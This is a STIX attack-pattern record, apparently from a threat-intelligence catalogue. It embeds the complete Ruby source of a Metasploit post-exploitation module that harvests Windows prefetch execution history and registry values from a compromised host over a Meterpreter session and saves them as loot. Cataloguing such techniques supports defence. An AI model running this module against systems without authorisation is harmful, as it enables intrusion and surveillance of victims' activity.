{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cbe2cc9f-bb8f-487d-a454-e2ed351232da",
    "created": "2024-08-14T16:33:05.050161Z",
    "modified": "2024-08-14T16:33:05.050165Z",
    "name": "Windows Gather Prefetch File Information",
    "description": " This module gathers prefetch file information from WinXP, Win2k3 and Win7 systems and current values of related registry keys. From each prefetch file we'll collect filetime (converted to utc) of the last execution, file path hash, run count, filename and the execution path.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_prefetch.rb",
            "external_id": "enum_prefetch.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Prefetch File Information',\n        'Description' => %q{\n          This module gathers prefetch file information from WinXP, Win2k3 and Win7 systems\n          and current values of related registry keys. From each prefetch file we'll collect\n          filetime (converted to utc) of the last execution, file path hash, run count, filename\n          and the execution path.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['TJ Glad <tjglad[at]cmail.nu>'],\n        'Platform' => ['win'],\n        'SessionType' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_search\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def print_prefetch_key_value\n    # Checks if Prefetch registry key exists and what value it has.\n    prefetch_key_value = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management\\\\PrefetchParameters', 'EnablePrefetcher')\n    if prefetch_key_value == 0\n      print_error('EnablePrefetcher Value: (0) = Disabled (Non-Default).')\n    elsif prefetch_key_value == 1\n      print_good('EnablePrefetcher Value: (1) = Application launch prefetching enabled (Non-Default).')\n    elsif prefetch_key_value == 2\n      print_good('EnablePrefetcher Value: (2) = Boot prefetching enabled (Non-Default, excl. Win2k3).')\n    elsif prefetch_key_value == 3\n      print_good('EnablePrefetcher Value: (3) = Applaunch and boot enabled (Default Value, excl. Win2k3).')\n    else\n      print_error('No value or unknown value. Results might vary.')\n    end\n  end\n\n  def print_timezone_key_values(key_value)\n    # Looks for timezone information from registry.\n    timezone = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\TimeZoneInformation', key_value)\n    tz_bias = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\TimeZoneInformation', 'Bias')\n    if timezone.nil? || tz_bias.nil?\n      print_line(\"Couldn't find key/value for timezone from registry.\")\n    else\n      print_good('Remote: Timezone is %s.' % timezone)\n      if tz_bias < 0xfff\n        print_good('Remote: Localtime bias to UTC: -%s minutes.' % tz_bias)\n      else\n        offset = 0xffffffff\n        bias = offset - tz_bias\n        print_good('Remote: Localtime bias to UTC: +%s minutes.' % bias)\n      end\n    end\n  end\n\n  def gather_pf_info(name_offset, hash_offset, runcount_offset, filetime_offset, filename)\n    # Collects the desired information from each prefetch file found\n    # from the system.\n\n    prefetch_file = read_file(filename)\n    if prefetch_file.blank?\n      print_error(\"Couldn't read file: #{filename}\")\n      return nil\n    else\n      # First we extract the saved filename\n      pf_filename = prefetch_file[name_offset, 60]\n      idx = pf_filename.index(\"\\x00\\x00\")\n      name = Rex::Text.to_ascii(pf_filename.slice(0..idx))\n\n      # Then we get the runcount\n      run_count = prefetch_file[runcount_offset, 4].unpack('v')[0]\n\n      # Then the filepath hash\n      path_hash = prefetch_file[hash_offset, 4].unpack('h*')[0].upcase.reverse\n\n      # Last we get the latest execution time\n      filetime_a = prefetch_file[filetime_offset, 16].unpack('q*')\n      filetime = filetime_a[0] + filetime_a[1]\n      last_exec = Time.at((filetime - 116444736000000000) / 10000000).utc.to_s\n\n      # This is for reading file paths of the executable from\n      # the prefetch file. We'll use this to find out from where the\n      # file was executed.\n\n      # First we'll use specific offsets for finding out the location\n      # and length of the filepath so that we can find it.\n      filepath = []\n      fpath_offset = prefetch_file[0x64, 2].unpack('v').first\n      fpath_length = prefetch_file[0x68, 2].unpack('v').first\n      filepath_data = prefetch_file[fpath_offset, fpath_length]\n\n      # This part will extract the filepath so that we can find and\n      # compare its contents to the filename we found previously. This\n      # allows us to find the filepath (if it can be found inside the\n      # prefetch file) used to execute the program\n      # referenced in the prefetch-file.\n      unless filepath_data.blank?\n        fpath_data_array = filepath_data.split(\"\\\\\\x00D\\x00E\\x00V\\x00I\\x00C\\x00E\")\n        fpath_data_array.each do |path|\n          next if path.blank?\n\n          fpath_name = path.split('\\\\').last.gsub(/\\0/, '')\n          if fpath_name == name\n            filepath << path\n          end\n        end\n      end\n    end\n    if filepath.blank?\n      filepath << '*** Filepath not found ***'\n    end\n\n    return [last_exec, path_hash, run_count, name, filepath[0]]\n  end\n\n  def run\n    print_status('Prefetch Gathering started.')\n\n    # Check to see what Windows Version is running.\n    # Needed for offsets.\n    # Tested on WinXP, Win2k3 and Win7 systems.\n    # http://www.forensicswiki.org/wiki/Prefetch\n    # http://www.forensicswiki.org/wiki/Windows_Prefetch_File_Format\n\n    error_msg = \"You don't have enough privileges. Try getsystem.\"\n\n    version = get_version_info\n    if version.xp_or_2003?\n\n      if !is_admin?\n        print_error(error_msg)\n        return nil\n      end\n\n      # Offsets for WinXP & Win2k3\n      print_good(\"Detected #{version.product_name} (max 128 entries)\")\n      name_offset = 0x10\n      hash_offset = 0x4C\n      runcount_offset = 0x90\n      filetime_offset = 0x78\n      # Registry key for timezone\n      key_value = 'StandardName'\n\n    elsif version.win7_or_2008r2? && !version.windows_server?\n      if !is_admin?\n        print_error(error_msg)\n        return nil\n      end\n\n      # Offsets for Win7\n      print_good(\"Detected #{version.product_name} (max 128 entries)\")\n      name_offset = 0x10\n      hash_offset = 0x4C\n      runcount_offset = 0x98\n      filetime_offset = 0x78\n      # Registry key for timezone\n      key_value = 'TimeZoneKeyName'\n    else\n      print_error('No offsets for the target Windows version. Currently works only on WinXP, Win2k3 and Win7.')\n      return nil\n    end\n\n    table = Rex::Text::Table.new(\n      'Header' => 'Prefetch Information',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Last execution (filetime)',\n        'Run Count',\n        'Hash',\n        'Filename',\n        'Filepath'\n      ]\n    )\n\n    print_prefetch_key_value\n    print_timezone_key_values(key_value)\n    print_good('Current UTC Time: %s' % Time.now.utc)\n    sys_root = session.sys.config.getenv('SYSTEMROOT')\n    full_path = sys_root + '\\\\Prefetch\\\\'\n    file_type = '*.pf'\n    print_status('Gathering information from remote system. This will take awhile..')\n\n    # Goes through the files in Prefetch directory, creates file paths for the\n    # gather_pf_info function that enumerates all the pf info\n\n    getfile_prefetch_filenames = client.fs.file.search(full_path, file_type)\n    if getfile_prefetch_filenames.empty? || getfile_prefetch_filenames.nil?\n      print_error(\"Could not find/access any .pf files. Can't continue. (Might be temporary error..)\")\n      return nil\n    else\n      getfile_prefetch_filenames.each do |file|\n        if file.empty? || file.nil?\n          next\n        else\n          filename = ::File.join(file['path'], file['name'])\n          pf_entry = gather_pf_info(name_offset, hash_offset, runcount_offset, filetime_offset, filename)\n          if !pf_entry.nil?\n            table << pf_entry\n          end\n        end\n      end\n    end\n\n    # Stores and prints out results\n    results = table.to_s\n    loot = store_loot('prefetch_info', 'text/plain', session, results, nil, 'Prefetch Information')\n    print_line(\"\\n\" + results + \"\\n\")\n    print_status('Finished gathering information from prefetch files.')\n    print_status(\"Results stored in: #{loot}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}